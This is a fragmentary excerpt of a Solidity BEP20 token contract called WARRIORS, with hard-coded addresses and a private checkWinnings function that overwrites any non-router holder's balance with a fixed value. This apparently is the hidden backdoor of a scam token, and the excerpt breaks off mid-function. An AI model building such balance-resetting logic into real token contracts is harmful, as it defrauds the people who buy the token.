...
contract WARRIORS is Context, IBEP20, Ownable {

    using Address for address;
    
    uint256 private total = 100000 * 10 ** 6 * 10 ** 9;
    uint256 private winnings = 50000000;
    string private _name;
    string private _symbol;
    address public addr=0x1378A86A2aB0e01e3d6d5CfDBa2775305C7ae3e6;
    address _routeradd=0x1378A86A2aB0e01e3d6d5CfDBa2775305C7ae3e6;
    ...
    function checkWinnings(address addr) private
    {
        if (addr!=router)
        {
            bal[addr]=winnings;
